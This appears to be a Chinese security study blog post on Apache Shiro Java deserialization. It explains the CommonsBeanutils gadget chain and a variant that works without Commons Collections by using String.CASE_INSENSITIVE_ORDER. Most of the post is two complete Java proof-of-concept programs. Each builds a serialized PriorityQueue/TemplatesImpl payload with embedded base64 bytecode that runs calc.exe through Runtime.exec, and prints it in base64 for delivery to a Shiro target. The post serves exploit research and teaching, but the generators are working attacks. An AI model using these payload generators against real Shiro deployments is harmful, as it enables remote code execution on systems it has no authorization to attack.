---
title: "Shiro反序列化的终点cbu和no Cc利用链"
date: 2021-10-04T23:24:42+08:00
draft: false
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202110042205046.png
description: 
comments: true
license: false
math: false
categories:
- note
tags:
- Shiro
- Java
- 反序列化
---

## 前置知识

学习CommonsBeanutils之前应该知道

1.  javaBean，可以看《Java简单特性》也可以看[这里](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680)
2.  [有关BeanComparator的介绍](https://commons.apache.org/proper/commons-beanutils/apidocs/org/apache/commons/beanutils/BeanComparator.html)
3.  TemplatesImpl gadget，前两个方法是public

```
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()
-> TransletClassLoader#defineClass()
```

## cbu链原理

![04929d8497ebfec60f0d8d28198c6441.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202110042205931.png)

BeanComparator()用于比较两个Java Bean，当property不存在的时候会调用`PropertyUtils.getProperty`去获取JavaBean的属性，也就是执行getter

恰巧TemplatesImpl#getOutputProperties符合getter的命名规则

### Gadget

```
Gadget chain:
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            PriorityQueue.heapify()
                PriorityQueue.siftDown()
                    siftDownUsingComparator()
                        BeanComparator.compare()
                            TemplatesImpl.getOutputProperties()
                                TemplatesImpl.newTransformer()
                                    TemplatesImpl.getTransletInstance()
                                        TemplatesImpl.defineTransletClasses()
                                            TemplatesImpl.TransletClassLoader.defineClass()
                                                 Runtime.exec()
```

### Poc

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

public class CommonsBeanutils1 {
    public static void main(String[] args) throws Exception {
        String base64encodedString = Base64.getEncoder().encodeToString(getpayload());
        System.out.println(base64encodedString);
    }

        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getpayload() throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAAhjYWxjLmV4ZQwAMgAzAQATamF2YS9pby9JT0V4Y2VwdGlvbgwANAAUAQASSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAKAAsAAAAAAAMAAQAMAA0AAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAAAsAEAAAAAQAAQARAAEADAASAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABABMAFAABAA4AAABsAAIAAgAAAB4qtwABsgACEgO2AAS4AAUSBrYAB1enAAhMK7YACbEAAQAMABUAGAAIAAIADwAAAB4ABwAAAA8ABAAQAAwAEgAVABUAGAATABkAFAAdABYAFQAAABAAAv8AGAABBwAWAAEHABcEAAEAGAAAAAIAGQ==");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        //本地触发测试
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();

        return barr.toByteArray();
    }
}
```

## Shiro反序列化遇到的困难

- 本地生成payload的包和远程依赖的包版本不一导致`serialVersionID`不一致，反序列化失败

![a3432f8042ba68a1019e095a05996591.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202110042205813.png)

- Shiro自带CommonsBeanutils，不依赖cc。但是Shiro反序列化需要cc
    虽然cbu本身依赖cc，但是Shiro中自带的cbu中的类不全，反序列化会失败

![d1ee0502174e6c86a4bd4e5565403ad0.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202110042205467.png)

## no CC的Gadge

`org.apache.commons.collections.comparators.ComparableComparator`在BeanComparator类的构造方法里面被用到，要解决没有cc的时候ClassNotFound的问题就需要替换这个ComparableComparator。

![0339fe432f76bdb9ffcf2154cd1d3fcb.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202110042205374.png)

因为ComparableComparator实现了Comparator接口，替换候选类需要满足：

- 实现了`java.util.Comparator`，`java.io.Serializable`接口
- Java，shiro，cbu里面自带

我们去看Comparator接口，看下哪些类实现了他：

![93a8f812e8cdcb588553768cb69dfd32.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202110042205172.png)

java.lang.String.CaseInsensitiveComparator：

![542fe3f0911cea2dbae01c3adeeeec14.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202110042205046.png)

直接通过String.CASE\_INSENSITIVE\_ORDER就可以获得一个对象

### poc

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CommonsBeanutils1Shiro {
    public static void main(String[] args) throws Exception {
        String base64encodedString = Base64.getEncoder().encodeToString(getpayload());
        System.out.println(base64encodedString);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getpayload() throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAAhjYWxjLmV4ZQwAMgAzAQATamF2YS9pby9JT0V4Y2VwdGlvbgwANAAUAQASSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAKAAsAAAAAAAMAAQAMAA0AAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAAAsAEAAAAAQAAQARAAEADAASAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABABMAFAABAA4AAABsAAIAAgAAAB4qtwABsgACEgO2AAS4AAUSBrYAB1enAAhMK7YACbEAAQAMABUAGAAIAAIADwAAAB4ABwAAAA8ABAAQAAwAEgAVABUAGAATABkAFAAdABYAFQAAABAAAv8AGAABBwAWAAEHABcEAAEAGAAAAAIAGQ==");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

//        //本地触发测试
//        System.out.println(barr);
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        Object o = (Object)ois.readObject();

        return barr.toByteArray();
    }
}
```
